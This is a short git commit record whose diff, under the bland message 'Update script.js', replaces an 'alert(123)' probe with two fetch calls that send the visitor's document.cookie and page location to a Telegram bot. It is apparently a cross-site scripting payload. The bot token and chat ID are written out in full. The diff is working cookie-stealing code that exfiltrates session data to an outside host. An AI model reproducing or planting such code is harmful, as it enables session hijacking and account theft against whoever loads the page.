373c022738e87ba5841a51a3f55a4ca55318ceca
Evsuikov Andrey <evsyukovandrey@yandex.ru>
2025-04-20 23:17:14 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,2 @@
-alert(123)
+fetch(`https://api.telegram.org/bot7843232563:AAG2tqEXcD5jWxykZ13pfBqq68OFUH-68bI/sendMessage?chat_id=458545916&text=${encodeURIComponent(document.cookie)}`);
+fetch(`https://api.telegram.org/bot7843232563:AAG2tqEXcD5jWxykZ13pfBqq68OFUH-68bI/sendMessage?chat_id=458545916&text=${encodeURIComponent(document.location)}`);
